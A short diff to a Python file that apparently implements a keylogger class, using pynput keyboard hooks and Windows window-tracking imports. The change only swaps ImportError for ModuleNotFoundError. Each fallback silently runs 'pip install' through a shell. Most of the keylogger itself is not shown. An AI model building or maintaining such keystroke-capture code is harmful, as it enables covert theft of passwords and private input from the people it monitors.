@@ -8,7 +8,7 @@ import getpass
 
 try:
     from pynput import keyboard
-except ImportError:
+except ModuleNotFoundError:
     subprocess.check_output("pip install pynput", shell=True, stderr=subprocess.STDOUT)
     from pynput import keyboard
 
@@ -92,7 +92,7 @@ class Keylogger:
                 import win32gui
                 import win32process
                 import psutil
-            except ImportError:
+            except ModuleNotFoundError:
                 subprocess.check_output("pip install pywin32 psutil", shell=True, stderr=subprocess.STDOUT)
                 import win32gui
                 import win32process
